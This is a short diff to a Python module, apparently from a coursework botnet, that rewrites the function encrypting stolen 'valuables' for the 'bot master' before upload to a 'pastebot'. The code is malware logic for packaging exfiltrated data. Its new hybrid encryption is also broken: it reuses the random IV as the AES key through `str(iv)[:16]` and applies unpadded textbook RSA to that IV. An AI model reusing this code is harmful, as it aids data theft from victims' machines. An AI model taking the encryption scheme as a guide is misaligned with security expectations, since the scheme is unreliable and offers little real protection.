@@ -1,10 +1,10 @@
 import os
 from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_v1_5
 from Crypto.Signature import PKCS1_PSS
 from Crypto.Hash import SHA256
 from Crypto import Random
 from Crypto.Cipher import AES
+from lib.crypto_utils import ANSI_X923_pad
 
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
@@ -20,16 +20,21 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-    hashed_data = SHA256.new(data);
+    hashed_data = SHA256.new(data).digest();
 
-    pkcs_cipher = PKCS1_v1_5.new(masters_public_key);
+    # generating a random IV
+    # note this will also be used as the sample key
+    iv = Random.get_random_bytes(AES.block_size)
+    aes_cipher = AES.new(str(iv)[:16], AES.MODE_CBC, iv)
 
-    # generate iv from RSA publickey
-    # generate AES CBC from RSA and iv
-    # encrypt AES key with RSA
-    # RSA(iv) + AES(file) + digest
+    # padding the data to the appropriate size
+    aes_encrypted_data = aes_cipher.encrypt(ANSI_X923_pad(data, AES.block_size))
 
-    return pkcs_cipher.encrypt(data) + hashed_data.digest();
+    # using rsa to encrypt the iv that was used for AES
+    # note that a tuple is returned so the first entry is what we want
+    rsa_encrypted_iv = masters_public_key.encrypt(iv, "")[0]
+
+    return rsa_encrypted_iv + aes_encrypted_data + hashed_data;
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
